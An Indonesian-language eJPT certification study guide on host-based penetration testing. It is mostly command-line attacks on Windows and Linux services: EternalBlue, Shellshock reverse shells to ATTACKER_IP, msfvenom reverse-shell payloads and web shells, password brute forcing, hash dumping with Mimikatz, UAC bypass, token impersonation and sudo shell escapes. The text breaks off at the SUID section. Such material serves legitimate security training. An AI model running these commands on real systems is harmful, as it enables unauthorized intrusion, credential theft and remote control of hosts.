# 🛡️ eJPT — System/Host Based Attacks
### Host & Network Penetration Testing

> **Disclaimer**: Seluruh materi ini hanya untuk tujuan **edukasi**, **sertifikasi**, dan **legal penetration testing** di lingkungan lab yang telah mendapat izin. Penggunaan teknik ini di luar konteks yang diizinkan adalah ilegal dan melanggar hukum.

---

## 📋 Daftar Isi

1. [Overview & Metodologi](#1-overview--metodologi)
2. [Windows-Based Attacks](#2-windows-based-attacks)
   - [IIS WebDAV](#21-iis-webdav)
   - [SMB Exploitation](#22-smb-exploitation)
   - [RDP Attacks](#23-rdp-attacks)
   - [WinRM](#24-winrm-windows-remote-management)
3. [Linux-Based Attacks](#3-linux-based-attacks)
   - [Shellshock](#31-shellshock-cve-2014-6271)
   - [FTP Exploitation](#32-ftp-exploitation)
   - [SSH Attacks](#33-ssh-attacks)
   - [Samba Exploitation](#34-samba-exploitation)
4. [Exploitation Framework](#4-exploitation-framework)
   - [Metasploit Framework](#41-metasploit-framework)
   - [Msfvenom](#42-msfvenom-payload-generator)
5. [Password Attacks](#5-password-attacks)
6. [Privilege Escalation](#6-privilege-escalation)
   - [Windows PrivEsc](#61-windows-privilege-escalation)
   - [Linux PrivEsc](#62-linux-privilege-escalation)
7. [Post-Exploitation](#7-post-exploitation)
8. [AV Evasion](#8-av-evasion)
9. [Vulnerability Scanning](#9-vulnerability-scanning)
10. [Cheat Sheet & Quick Reference](#10-cheat-sheet--quick-reference)

---

## 1. Overview & Metodologi

### Apa itu System/Host Based Attacks?

System/Host Based Attacks adalah sekumpulan teknik serangan yang menargetkan **sistem operasi**, **layanan**, dan **konfigurasi** pada host individual. Berbeda dengan network attacks yang fokus pada infrastruktur jaringan, serangan ini fokus pada eksploitasi kelemahan di tingkat OS dan aplikasi.

### Fase Penetration Testing

```
┌─────────────────────────────────────────────────────────────────┐
│                    PENETRATION TESTING LIFECYCLE                │
├──────────┬──────────┬────────────┬────────────┬────────────────┤
│  1. Recon│ 2. Scan  │  3. Enum   │  4. Exploit│  5. Post-Exploit│
│          │          │            │            │                │
│ • Pasif  │ • Nmap   │ • Users    │ • Metasploit│ • PrivEsc     │
│ • Aktif  │ • Nessus │ • Shares   │ • Manual   │ • Persistence  │
│ • OSINT  │ • Nikto  │ • Services │ • Custom   │ • Pivoting     │
└──────────┴──────────┴────────────┴────────────┴────────────────┘
```

### Tools Utama yang Dibutuhkan

| Kategori | Tools |
|---|---|
| Scanning | `nmap`, `masscan`, `nessus` |
| Enumeration | `enum4linux`, `smbclient`, `smbmap` |
| Exploitation | `metasploit`, `msfvenom` |
| Password | `hydra`, `john`, `hashcat`, `medusa` |
| Post-Exploit | `meterpreter`, `winpeas`, `linpeas` |
| Web | `nikto`, `gobuster`, `davtest`, `cadaver` |

---

## 2. Windows-Based Attacks

### 2.1 IIS WebDAV

#### Apa itu WebDAV?

**WebDAV** (Web Distributed Authoring and Versioning) adalah ekstensi dari protokol HTTP yang memungkinkan pengguna mengelola file di web server secara remote. Jika dikonfigurasi dengan buruk di **IIS (Internet Information Services)**, WebDAV bisa menjadi vektor serangan untuk eksekusi kode berbahaya.

**Port default**: `80 (HTTP)` / `443 (HTTPS)`

#### Deteksi WebDAV

```bash
# Nmap deteksi WebDAV
nmap -p 80 --script http-webdav-scan TARGET_IP

# Davtest - uji apa saja yang bisa diupload
davtest -url http://TARGET_IP/webdav/

# Hasil output davtest:
# SUCCEED: txt
# SUCCEED: html
# SUCCEED: asp     ← ini yang berbahaya!
# SUCCEED: aspx
```

#### Eksploitasi dengan Cadaver

```bash
# Login ke WebDAV
cadaver http://TARGET_IP/webdav/

# Di dalam cadaver shell:
dav:/webdav/> put /path/to/shell.asp shell.asp
dav:/webdav/> ls
dav:/webdav/> quit

# Akses shell
curl http://TARGET_IP/webdav/shell.asp
```

#### Eksploitasi via Metasploit

```bash
use exploit/windows/iis/iis_webdav_upload_asp
set RHOSTS TARGET_IP
set TARGETURI /webdav/
set HttpUsername admin
set HttpPassword password123
set LHOST ATTACKER_IP
set LPORT 4444
run
```

#### Upload Web Shell Manual

```bash
# Generate shell dengan msfvenom
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f asp > shell.asp

# Upload menggunakan curl
curl -T shell.asp http://TARGET_IP/webdav/ \
  --user "admin:password"

# Trigger shell (sambil jalankan listener)
curl http://TARGET_IP/webdav/shell.asp
```

---

### 2.2 SMB Exploitation

#### Apa itu SMB?

**SMB** (Server Message Block) adalah protokol jaringan untuk berbagi file, printer, dan resources antar komputer. Berjalan di port **445** dan **139**, dan merupakan salah satu service paling sering menjadi target di Windows.

#### Enumerasi SMB

```bash
# Nmap enumerasi SMB
nmap -p 445 --script smb-enum-shares,smb-enum-users TARGET_IP
nmap -p 445 --script smb-security-mode TARGET_IP

# Enum4linux - enumerasi lengkap
enum4linux -a TARGET_IP
enum4linux -U TARGET_IP    # hanya users
enum4linux -S TARGET_IP    # hanya shares

# SMBMap - pemetaan shares
smbmap -H TARGET_IP
smbmap -H TARGET_IP -u "" -p ""          # anonymous
smbmap -H TARGET_IP -u admin -p Password1
smbmap -H TARGET_IP -r ShareName         # rekursif

# SMBClient - akses interaktif
smbclient -L \\TARGET_IP -N              # list shares tanpa password
smbclient \\\\TARGET_IP\\ShareName -N    # akses share
smbclient \\\\TARGET_IP\\C$ -U admin     # akses C$ admin
```

#### EternalBlue (MS17-010)

EternalBlue adalah eksploit NSA yang memanfaatkan kerentanan buffer overflow di implementasi SMBv1 Windows. Digunakan dalam serangan WannaCry dan NotPetya.

**Sistem rentan**: Windows 7, Windows Server 2008 R2, dan versi lebih lama yang belum di-patch.

```bash
# Cek apakah target rentan
nmap -p 445 --script smb-vuln-ms17-010 TARGET_IP

# Jika output: VULNERABLE

# Eksploitasi via Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
```

#### PsExec via SMB

PsExec memungkinkan eksekusi command remote dengan memanfaatkan autentikasi SMB.

```bash
# Metasploit PsExec
use exploit/windows/smb/psexec
set RHOSTS TARGET_IP
set SMBUser administrator
set SMBPass Password123
set LHOST ATTACKER_IP
set PAYLOAD windows/meterpreter/reverse_tcp
run

# Impacket PsExec (Python)
psexec.py administrator:Password123@TARGET_IP
psexec.py -hashes :NTLM_HASH administrator@TARGET_IP  # pass-the-hash
```

#### SMB Brute Force

```bash
# Hydra
hydra -L users.txt -P passwords.txt smb://TARGET_IP
hydra -l administrator -P rockyou.txt smb://TARGET_IP

# Metasploit SMB Login Scanner
use auxiliary/scanner/smb/smb_login
set RHOSTS TARGET_IP
set USER_FILE /usr/share/wordlists/users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

---

### 2.3 RDP Attacks

#### Apa itu RDP?

**RDP** (Remote Desktop Protocol) adalah protokol Microsoft yang memungkinkan akses GUI remote ke Windows. Berjalan di port **3389**.

#### Enumerasi RDP

```bash
# Nmap deteksi RDP
nmap -p 3389 --script rdp-enum-encryption TARGET_IP
nmap -p 3389 --script rdp-vuln-ms12-020 TARGET_IP
```

#### Brute Force RDP

```bash
# Hydra
hydra -L users.txt -P passwords.txt rdp://TARGET_IP
hydra -l administrator -P rockyou.txt rdp://TARGET_IP -t 4

# Crowbar (lebih stabil untuk RDP)
crowbar -b rdp -s TARGET_IP/32 -u administrator -C passwords.txt
```

#### BlueKeep (CVE-2019-0708)

Kerentanan kritis RDP yang memungkinkan RCE **tanpa autentikasi** (unauthenticated pre-auth). Memengaruhi Windows 7, Windows Server 2008/2008 R2, Windows XP, Windows Server 2003.

```bash
# Cek kerentanan BlueKeep
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS TARGET_IP
run

# Eksploitasi (unstable, perlu tuning)
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
run
```

#### Akses RDP Setelah Dapat Kredensial

```bash
# Linux menggunakan xfreerdp
xfreerdp /u:administrator /p:Password123 /v:TARGET_IP
xfreerdp /u:administrator /p:Password123 /v:TARGET_IP /cert-ignore

# rdesktop
rdesktop -u administrator -p Password123 TARGET_IP
```

---

### 2.4 WinRM (Windows Remote Management)

#### Apa itu WinRM?

**WinRM** adalah implementasi Microsoft dari protokol WS-Management yang memungkinkan manajemen sistem remote. Digunakan oleh PowerShell remoting.

**Port**: `5985 (HTTP)` / `5986 (HTTPS)`

#### Deteksi & Brute Force

```bash
# Nmap deteksi WinRM
nmap -p 5985,5986 TARGET_IP

# CrackMapExec brute force
crackmapexec winrm TARGET_IP -u users.txt -p passwords.txt
crackmapexec winrm TARGET_IP -u administrator -p Password123

# Metasploit
use auxiliary/scanner/winrm/winrm_login
set RHOSTS TARGET_IP
set USERNAME administrator
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

#### Akses Shell via Evil-WinRM

```bash
# Install
gem install evil-winrm

# Koneksi dasar
evil-winrm -i TARGET_IP -u administrator -p Password123

# Dengan hash (pass-the-hash)
evil-winrm -i TARGET_IP -u administrator -H NTLM_HASH_HERE

# Upload file
*Evil-WinRM* PS C:\> upload /local/path/file.exe C:\Users\admin\file.exe

# Download file
*Evil-WinRM* PS C:\> download C:\Users\admin\file.txt /local/path/
```

---

## 3. Linux-Based Attacks

### 3.1 Shellshock (CVE-2014-6271)

#### Apa itu Shellshock?

Shellshock adalah kerentanan kritis pada **GNU Bash** (versi ≤ 4.3) yang memungkinkan eksekusi arbitrary command melalui variabel environment. Paling sering dieksploitasi via **CGI scripts** di Apache web server.

**Cara kerja**: Bash memproses function definitions dalam environment variable. Kerentanan memungkinkan tambahan command setelah definisi function ikut dieksekusi.

```bash
# Contoh payload Shellshock
env x='() { :;}; echo VULNERABLE' bash -c 'echo test'
# Jika output: VULNERABLE → sistem rentan
```

#### Deteksi via Nmap

```bash
nmap -p 80 --script http-shellshock TARGET_IP
nmap -p 80 --script http-shellshock \
  --script-args uri=/cgi-bin/test.cgi TARGET_IP
```

#### Eksploitasi Manual

```bash
# Cek kerentanan
curl -H "User-Agent: () { :; }; echo Content-Type: text/html; echo; /bin/id" \
  http://TARGET_IP/cgi-bin/vulnerable.cgi

# Reverse shell
# 1. Siapkan listener
nc -lvnp 4444

# 2. Kirim payload
curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" \
  http://TARGET_IP/cgi-bin/vulnerable.cgi
```

#### Eksploitasi via Metasploit

```bash
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS TARGET_IP
set TARGETURI /cgi-bin/vulnerable.cgi
set LHOST ATTACKER_IP
set LPORT 4444
run
```

---

### 3.2 FTP Exploitation

#### Enumerasi FTP

```bash
# Nmap FTP scan
nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst TARGET_IP

# Cek anonymous login
ftp TARGET_IP
# Username: anonymous
# Password: (kosong atau email@email.com)

# List files setelah login
ftp> ls -la
ftp> get file.txt
ftp> put shell.php
```

#### vsFTPd 2.3.4 Backdoor

Versi ini memiliki backdoor yang sengaja ditanamkan. Trigger dengan mengirim `:)` (smiley face) di username.

```bash
# Metasploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS TARGET_IP
run
# Akan mendapatkan shell langsung tanpa payload tambahan
```

#### Brute Force FTP

```bash
# Hydra
hydra -l admin -P rockyou.txt ftp://TARGET_IP
hydra -L users.txt -P passwords.txt ftp://TARGET_IP -t 4

# Medusa
medusa -h TARGET_IP -u admin -P rockyou.txt -M ftp
```

---

### 3.3 SSH Attacks

#### Enumerasi SSH

```bash
# Nmap SSH info
nmap -p 22 --script ssh-auth-methods,ssh2-enum-algos TARGET_IP
nmap -p 22 --script ssh-hostkey TARGET_IP

# Banner grabbing
nc TARGET_IP 22
```

#### Brute Force SSH

```bash
# Hydra
hydra -l root -P rockyou.txt ssh://TARGET_IP
hydra -L users.txt -P passwords.txt ssh://TARGET_IP -t 4

# Medusa
medusa -h TARGET_IP -u root -P rockyou.txt -M ssh

# Metasploit
use auxiliary/scanner/ssh/ssh_login
set RHOSTS TARGET_IP
set USERNAME root
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

#### Akses dengan Private Key

```bash
# Jika menemukan private key (id_rsa)
chmod 600 id_rsa
ssh -i id_rsa user@TARGET_IP

# Jika key terproteksi passphrase, crack dengan john
python3 ssh2john.py id_rsa > id_rsa_hash.txt
john --wordlist=rockyou.txt id_rsa_hash.txt
```

---

### 3.4 Samba Exploitation

#### Enumerasi Samba

```bash
# Enum4linux
enum4linux -a TARGET_IP

# smbmap
smbmap -H TARGET_IP

# smbclient
smbclient -L //TARGET_IP/ -N

# Nmap Samba scripts
nmap -p 445 --script smb-enum-shares,smb-enum-users TARGET_IP
```

#### Samba usermap_script (CVE-2007-2447)

Kerentanan pada Samba versi 3.0.20 - 3.0.25rc3 yang memungkinkan command injection via username field.

```bash
use exploit/multi/samba/usermap_script
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
set LPORT 4444
run
```

---

## 4. Exploitation Framework

### 4.1 Metasploit Framework

#### Struktur Direktori Penting

```
/usr/share/metasploit-framework/
├── modules/
│   ├── exploits/          ← exploit modules
│   ├── auxiliary/         ← scanner, bruteforce, dll
│   ├── post/              ← post-exploitation
│   └── payloads/          ← payload generators
├── scripts/
└── tools/
```

#### Perintah Dasar msfconsole

```bash
# Mulai Metasploit
msfconsole

# Pencarian module
search ms17-010
search type:exploit platform:windows smb
search cve:2019-0708

# Gunakan module
use exploit/windows/smb/ms17_010_eternalblue
use 0                         # gunakan nomor dari hasil search

# Informasi module
info
show options
show payloads
show targets

# Set parameter
set RHOSTS 192.168.1.100
set RPORT 445
set LHOST 192.168.1.10
set LPORT 4444
set PAYLOAD windows/x64/meterpreter/reverse_tcp

# Set global (berlaku untuk semua module)
setg LHOST 192.168.1.10

# Jalankan
run
exploit
exploit -j    # jalankan sebagai background job

# Manajemen sesi
sessions
sessions -l                    # list sesi
sessions -i 1                  # interaksi dengan sesi 1
sessions -k 1                  # kill sesi 1
sessions -u 1                  # upgrade ke meterpreter

# Background current session
background
Ctrl+Z

# Jobs
jobs                           # list background jobs
jobs -k 1                      # kill job
```

#### Jenis-jenis Payload

| Tipe | Deskripsi | Contoh |
|---|---|---|
| `singles` | Self-contained, tidak perlu stage | `windows/shell_reverse_tcp` |
| `stagers` | Kecil, setup koneksi, load stage | `windows/meterpreter/reverse_tcp` |
| `stages` | Fungsionalitas penuh (meterpreter) | Diload oleh stager |

#### Payload Penting

```bash
# Windows - paling sering digunakan
windows/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp
windows/meterpreter/reverse_https   # lebih sulit dideteksi
windows/shell_reverse_tcp           # shell biasa tanpa meterpreter

# Linux
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp
linux/x86/shell_reverse_tcp

# Multi-platform
java/meterpreter/reverse_tcp
python/meterpreter/reverse_tcp
php/meterpreter/reverse_tcp
```

---

### 4.2 Msfvenom Payload Generator

#### Format File yang Didukung

```bash
# Lihat semua format
msfvenom --list formats

# Format umum:
# exe, elf, apk, jsp, asp, aspx, php, py, rb, ps1, hta, jar
```

#### Membuat Payload

```bash
# ─── WINDOWS ───────────────────────────────────────────────

# EXE Reverse Shell
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f exe -o shell.exe

# EXE 64-bit
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f exe -o shell64.exe

# DLL
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f dll -o malicious.dll

# PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f psh-reflection -o shell.ps1

# ─── LINUX ─────────────────────────────────────────────────

# ELF Binary
msfvenom -p linux/x86/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f elf -o shell.elf

# ELF 64-bit
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f elf -o shell64.elf

# ─── WEB SHELL ─────────────────────────────────────────────

# PHP
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f raw -o shell.php

# ASP (IIS)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f asp -o shell.asp

# ASPX
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f aspx -o shell.aspx

# JSP (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f raw -o shell.jsp

# WAR (Tomcat deploy)
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f war -o shell.war
```

#### Setup Listener (Handler)

```bash
# Di Metasploit
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run -j    # jalankan sebagai background job

# Atau bisa menggunakan netcat untuk shell biasa
nc -lvnp 4444
```

---

## 5. Password Attacks

### Jenis Serangan Password

| Jenis | Deskripsi | Kapan Digunakan |
|---|---|---|
| **Brute Force** | Coba semua kombinasi | Password pendek, tanpa wordlist |
| **Dictionary Attack** | Gunakan daftar kata | Umum digunakan |
| **Rule-based** | Wordlist + transformasi | `Password123`, `p@ssw0rd` |
| **Pass-the-Hash** | Gunakan hash langsung | Setelah dump hash dari memori |
| **Rainbow Table** | Tabel hash precomputed | Hash tanpa salt |

### Hydra — Network Brute Force

```bash
# HTTP POST Form Login
hydra -l admin -P rockyou.txt \
  http-post-form "TARGET_IP/login:username=^USER^&password=^PASS^:Invalid credentials"

# HTTP Basic Auth
hydra -l admin -P rockyou.txt http-get://TARGET_IP/admin/

# SSH
hydra -l root -P rockyou.txt ssh://TARGET_IP -t 4

# FTP
hydra -l admin -P rockyou.txt ftp://TARGET_IP

# SMB
hydra -L users.txt -P passwords.txt smb://TARGET_IP

# RDP
hydra -l administrator -P rockyou.txt rdp://TARGET_IP

# MySQL
hydra -l root -P rockyou.txt mysql://TARGET_IP

# Tips: gunakan -t untuk jumlah thread, -f stop di temuan pertama
hydra -l admin -P rockyou.txt ssh://TARGET_IP -t 8 -f -V
```

### John the Ripper — Hash Cracking

```bash
# Identifikasi jenis hash dulu
hash-identifier HASH_VALUE

# Crack langsung
john hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --wordlist=rockyou.txt --rules hash.txt    # dengan rules

# Format spesifik
john --format=md5crypt hash.txt
john --format=bcrypt hash.txt
john --format=NT hash.txt              # Windows NTLM

# /etc/shadow Linux
unshadow /etc/passwd /etc/shadow > combined.txt
john combined.txt

# SSH private key passphrase
ssh2john id_rsa > id_rsa.hash
john --wordlist=rockyou.txt id_rsa.hash

# Lihat password yang sudah di-crack
john --show hash.txt
```

### Hashcat — GPU-Accelerated Cracking

```bash
# Identifikasi hash mode
hashcat --example-hashes | grep -i NTLM

# Mode yang sering digunakan:
# 0     = MD5
# 100   = SHA1
# 1000  = NTLM (Windows)
# 1800  = sha512crypt (Linux $6$)
# 3200  = bcrypt
# 500   = md5crypt (Linux $1$)
# 1400  = SHA-256
# 5500  = NetNTLMv1
# 5600  = NetNTLMv2

# Dictionary attack
hashcat -m 1000 hash.txt rockyou.txt

# Dictionary + rules
hashcat -m 1000 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Brute force (mask attack)
hashcat -m 1000 hash.txt -a 3 ?a?a?a?a?a?a?a?a

# Mask characters:
# ?l = lowercase a-z
# ?u = uppercase A-Z
# ?d = digits 0-9
# ?s = special !@#$...
# ?a = all (?l?u?d?s)

# Kombinasi wordlist
hashcat -m 1000 hash.txt -a 1 wordlist1.txt wordlist2.txt
```

### Mendapatkan Hash

```bash
# ─── WINDOWS ───────────────────────────────────────────────

# Dari Meterpreter (butuh SYSTEM)
meterpreter> hashdump
meterpreter> run post/windows/gather/hashdump
meterpreter> run post/windows/gather/credentials/credential_collector

# Mimikatz via Metasploit
meterpreter> load kiwi
meterpreter> creds_all
meterpreter> lsa_dump_sam
meterpreter> lsa_dump_secrets

# ─── LINUX ─────────────────────────────────────────────────

# Jika root, dump langsung
cat /etc/shadow
cat /etc/passwd

# Unshadow untuk john
unshadow /etc/passwd /etc/shadow > hashes.txt
```

---

## 6. Privilege Escalation

### 6.1 Windows Privilege Escalation

## Konsep Dasar
 
**Privilege Escalation** = naik dari user biasa → Administrator / SYSTEM.
 
### Integrity Level di Windows
 
| Level | Keterangan | Contoh |
|---|---|---|
| Low | Sangat terbatas | Sandbox, browser |
| Medium | User biasa | Shell awal setelah exploit |
| High | Administrator aktif | Setelah UAC bypass |
| SYSTEM | Tertinggi | `NT AUTHORITY\SYSTEM` |
 
### Alur Umum
 
```
Dapat shell (Medium)
      ↓
Enumeration → cari celah
      ↓
Eksploitasi teknik PrivEsc
      ↓
NT AUTHORITY\SYSTEM
```
 
---
 
**1. Windows Kernel Exploits**

**Konsep**
 
Memanfaatkan **kerentanan di kernel Windows** yang belum di-patch. Cocok untuk sistem lama yang jarang diupdate.
 
**Langkah**
 
```bash
# 1. Cek versi OS di Meterpreter
meterpreter > sysinfo
 
# 2. Cari exploit yang cocok dengan versi OS
meterpreter > run post/multi/recon/local_exploit_suggester
 
# 3. Catat exploit yang disarankan, lalu background sesi
meterpreter > background
 
# 4. Load dan jalankan exploit
msf > use <nama_exploit>
msf > set SESSION <nomor_sesi>
msf > run
 
# 5. Verifikasi
meterpreter > getuid
# NT AUTHORITY\SYSTEM
```
 
### Tools Tambahan (manual)
 
```bash
# Upload Windows Exploit Suggester ke target
# Di Kali:
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database <file.xlsx> --systeminfo <systeminfo.txt>
```
 
### Contoh Exploit Umum
 
| Exploit | Target OS |
|---|---|
| MS17-010 (EternalBlue) | Windows 7 / 2008 R2 |
| MS16-032 | Windows 7–10 / 2008–2012 |
| MS15-051 | Windows 7 / 2008 |
 
### Tips
 
- Selalu jalankan `local_exploit_suggester` dulu sebelum coba manual
- Kernel exploit bisa crash sistem — gunakan sebagai opsi terakhir
- Pastikan arsitektur exploit match dengan OS (x86/x64)
---
 
## 2. Bypassing UAC with UACMe
 
### Konsep
 
**UAC (User Account Control)** = mekanisme Windows yang meminta konfirmasi sebelum menjalankan aksi privilege tinggi.
 
**UACMe** = tool berisi 40+ teknik bypass UAC, masing-masing memanfaatkan celah Windows yang berbeda.
 
> Meskipun username "admin", tanpa bypass UAC kamu masih di Medium Integrity — banyak aksi yang tidak bisa dilakukan.
 
### Persiapan Sebelum UAC Bypass
 
```bash
# 1. Pastikan sudah migrate ke explorer.exe (x64)
meterpreter > pgrep explorer
meterpreter > migrate <PID>
 
# 2. Verifikasi sudah x64
meterpreter > sysinfo
# Meterpreter: x64/windows ✓
 
# 3. Generate payload x64 di Kali
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<IP_KALI> LPORT=4444 -f exe -o backdoor.exe
 
# 4. Siapkan listener
msf > use multi/handler
msf > set payload windows/x64/meterpreter/reverse_tcp
msf > set LHOST <IP_KALI>
msf > set LPORT 4444
msf > run
```
 
### Eksekusi UACMe
 
```bash
# 5. Upload Akagi64.exe dan backdoor.exe ke target
meterpreter > upload Akagi64.exe C:\\Users\\admin\\AppData\\Local\\Temp
meterpreter > upload backdoor.exe C:\\Users\\admin\\AppData\\Local\\Temp
 
# 6. Jalankan UACMe
meterpreter > shell
C:\> C:\Users\admin\AppData\Local\Temp\Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe
 
# 7. Sesi baru masuk di listener → migrate ke lsass
meterpreter > migrate <PID_lsass>
 
# 8. Verifikasi
meterpreter > getuid
# NT AUTHORITY\SYSTEM ✓
```
 
### Pilih Nomor Metode UACMe
 
| Nomor | Teknik | Target OS |
|---|---|---|
| 23 | `eventvwr.exe` | Win 7 / 2008 / 2012 ← paling sering di eJPT |
| 30 | `fodhelper.exe` | Windows 10 |
| 33 | `diskcleanup` scheduled task | Windows 10 |
| 41 | `schtasks` COM hijack | Windows 10 baru |
 
### Kenapa Harus Migrate ke explorer.exe Dulu?
 
- Shell awal biasanya x86 (proses yang di-exploit 32-bit)
- `explorer.exe` adalah proses x64 dengan token sesi interaktif user
- Tanpa migrate → payload x64 tidak bisa dijalankan, UAC bypass gagal
---
 
## 3. Access Token Impersonation
 
### Konsep
 
**Access Token** = "kartu identitas" proses di Windows. Berisi info: siapa user-nya, privilege apa yang dimiliki, integrity level berapa.
 
**Impersonation** = "mencuri" token milik proses lain yang privilege-nya lebih tinggi — misalnya token milik SYSTEM — dan menggunakannya untuk diri sendiri.
 
### Privilege yang Dibutuhkan
 
Teknik ini membutuhkan salah satu dari:
 
| Privilege | Keterangan |
|---|---|
| `SeImpersonatePrivilege` | Boleh impersonate token user lain |
| `SeAssignPrimaryTokenPrivilege` | Boleh assign token ke proses |
 
```bash
# Cek privilege yang tersedia
meterpreter > getprivs
# atau di shell:
C:\> whoami /priv
```
 
### Teknik: Potato Attacks
 
Jika `SeImpersonatePrivilege` tersedia, gunakan **Potato exploit**:
 
| Tool | Target OS |
|---|---|
| `JuicyPotato` | Windows 7–10 / 2008–2016 |
| `PrintSpoofer` | Windows 10 / 2019 |
| `RoguePotato` | Windows 10 / 2019 |
 
### Eksekusi via Metasploit (Incognito)
 
```bash
# 1. Load modul incognito
meterpreter > load incognito
 
# 2. List token yang tersedia
meterpreter > list_tokens -u
 
# 3. Impersonate token SYSTEM atau Administrator
meterpreter > impersonate_token "NT AUTHORITY\\SYSTEM"
 
# 4. Verifikasi
meterpreter > getuid
# NT AUTHORITY\SYSTEM ✓
 
# 5. Kalau getuid berhasil tapi privilege masih terbatas
meterpreter > getsystem
```
 
### Eksekusi Manual (JuicyPotato)
 
```bash
# 1. Upload JuicyPotato.exe dan backdoor.exe ke target
meterpreter > upload JuicyPotato.exe C:\\Temp
meterpreter > upload backdoor.exe C:\\Temp
 
# 2. Jalankan
C:\Temp> JuicyPotato.exe -l 4445 -p backdoor.exe -t * -c <CLSID>
 
# CLSID berbeda tiap versi Windows
# Referensi: https://github.com/ohpe/juicy-potato/tree/master/CLSID
```
 
### Tips
 
- Cek `SeImpersonatePrivilege` dulu — kalau tidak ada, teknik ini tidak akan jalan
- Service account (IIS, SQL Server) hampir selalu punya `SeImpersonatePrivilege`
- Kalau `impersonate_token` berhasil tapi proses tidak stabil, migrate ke proses SYSTEM yang stabil seperti `services.exe`
---
 
## Ringkasan Alur Pemilihan Teknik
 
```
Dapat shell di Windows
        ↓
Jalankan: local_exploit_suggester + whoami /priv
        ↓
        ├── OS lama, belum patch?
        │     └── Kernel Exploit (MS17-010, MS16-032, dll)
        │
        ├── User adalah admin tapi UAC aktif?
        │     └── UAC Bypass dengan UACMe (metode 23 untuk 2012)
        │
        └── SeImpersonatePrivilege tersedia?
              └── Token Impersonation (Incognito / JuicyPotato)
```
 
---
 
## Command Penting — Quick Reference
 
```bash
# Enumeration
sysinfo                          # info OS dan arsitektur
getuid                           # cek user saat ini
getprivs                         # cek privilege
run post/multi/recon/local_exploit_suggester  # cari exploit otomatis
 
# Migration
pgrep explorer                   # cari PID explorer
migrate <PID>                    # pindah ke proses lain
 
# UAC Bypass
Akagi64.exe 23 <path_payload>    # jalankan UACMe metode 23
 
# Token Impersonation
load incognito                   # load modul
list_tokens -u                   # list token tersedia
impersonate_token "NT AUTHORITY\\SYSTEM"  # impersonate token
 
# Eskalasi ke SYSTEM
getsystem                        # otomatis coba berbagai teknik
migrate <PID_lsass>              # migrate ke lsass.exe
```
 
--- 

#### Enumerasi Manual

```cmd
# Info sistem
systeminfo
hostname
whoami /all
net user
net localgroup administrators

# Processes yang berjalan
tasklist /v
wmic process list brief

# Services
sc query
wmic service list brief
net start

# Scheduled Tasks
schtasks /query /fo LIST /v

# Installed programs
wmic product get name,version

# Network
netstat -ano
ipconfig /all
route print

# Firewall
netsh firewall show state
netsh advfirewall show allprofiles
```

### 6.2 Linux Privilege Escalation

#### Enumerasi Manual

```bash
# Info sistem
id
whoami
uname -a
cat /etc/os-release
cat /proc/version

# Users dan groups
cat /etc/passwd
cat /etc/shadow    # butuh root
cat /etc/group
sudo -l            # apa yang bisa dijalankan dengan sudo

# SUID/SGID files - PENTING!
find / -perm -4000 -type f 2>/dev/null   # SUID
find / -perm -2000 -type f 2>/dev/null   # SGID
find / -perm -6000 -type f 2>/dev/null   # SUID + SGID

# Writable directories
find / -writable -type d 2>/dev/null

# Cron jobs
cat /etc/crontab
cat /etc/cron.d/*
ls -la /var/spool/cron/crontabs/
crontab -l

# Capabilities
getcap -r / 2>/dev/null

# Network
netstat -tulpn
ss -tulpn
cat /etc/hosts

# Proses
ps aux
ps -ef
```

#### Teknik Privilege Escalation Linux

**1. Sudo Misconfiguration**

```bash
# Cek sudo privileges
sudo -l

# Contoh output berbahaya:
# (ALL) NOPASSWD: /usr/bin/python3
# (ALL) NOPASSWD: /usr/bin/find
# (ALL) NOPASSWD: /usr/bin/vim

# Eksploitasi - GTFOBins adalah referensi utama
# sudo python3
sudo python3 -c 'import os; os.execl("/bin/sh", "sh")'

# sudo find
sudo find . -exec /bin/sh \; -quit

# sudo vim
sudo vim -c ':!/bin/sh'

# sudo awk
sudo awk 'BEGIN {system("/bin/sh")}'
```

**2. SUID Binary Exploitation**

```bash
